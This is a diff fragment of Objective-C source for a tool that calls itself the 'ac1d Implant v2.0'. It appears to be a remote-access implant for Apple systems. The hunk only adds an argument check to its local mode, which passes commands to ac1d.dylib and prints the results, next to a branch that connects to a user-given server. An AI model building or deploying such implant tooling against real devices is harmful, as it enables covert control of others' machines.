@@ -60,26 +60,29 @@ int main(int argc, const char *argv[]) {
                     connectToServer(args[2], [args[3] integerValue]);
                 }
             } else if ([args[1] isEqualToString:@"-l"] || [args[1] isEqualToString:@"--local"]) {
-                debug = NO;
-                for (int i = 0; i < [args count]; i++) {
-                    if ([args[i] isEqualToString:@"-d"] || [args[i] isEqualToString:@"-d"]) {
-                        debug = YES;
+                if (argc < 3) showHelpMessage();
+                else {
+                    debug = NO;
+                    for (int i = 0; i < [args count]; i++) {
+                        if ([args[i] isEqualToString:@"-d"] || [args[i] isEqualToString:@"-d"]) {
+                            debug = YES;
+                        }
                     }
+                    NSMutableArray *command_args = [NSMutableArray array];
+                    for (int i = 2; i < [args count]; i++) {
+                        [command_args addObject:args[i]];
+                    }
+                    if ([commands containsObject:args[2]]) {
+                        if (debug) printf("[i] ac1d Implant v2.0\n");
+                        if (debug) printf("[i] Copyright (c) 2020 Ivan Nikolsky\n");
+                        if (debug) printf("[*] Executing %s...\n", [args[2] UTF8String]);
+                        NSString *result = [ac1d_base sendCommand:command_args];
+                        if (result) {
+                            if ([result isEqualToString:@""]) if (debug) printf("[!] Command output empty, sending anyway.\n");
+                            printf("%s", [result UTF8String]);
+                        } else if (debug) printf("[-] Failed to execute command, ac1d.dylib not found!\n");
+                    } else showHelpMessage();
                 }
-                NSMutableArray *command_args = [NSMutableArray array];
-                for (int i = 2; i < [args count]; i++) {
-                    [command_args addObject:args[i]];
-                }
-                if ([commands containsObject:args[2]]) {
-                    if (debug) printf("[i] ac1d Implant v2.0\n");
-                    if (debug) printf("[i] Copyright (c) 2020 Ivan Nikolsky\n");
-                    if (debug) printf("[*] Executing %s...\n", [args[2] UTF8String]);
-                    NSString *result = [ac1d_base sendCommand:command_args];
-                    if (result) {
-                        if ([result isEqualToString:@""]) if (debug) printf("[!] Command output empty, sending anyway.\n");
-                        printf("%s", [result UTF8String]);
-                    } else if (debug) printf("[-] Failed to execute command, ac1d.dylib not found!\n");
-                } else showHelpMessage();
             } else showHelpMessage();
         }
     }
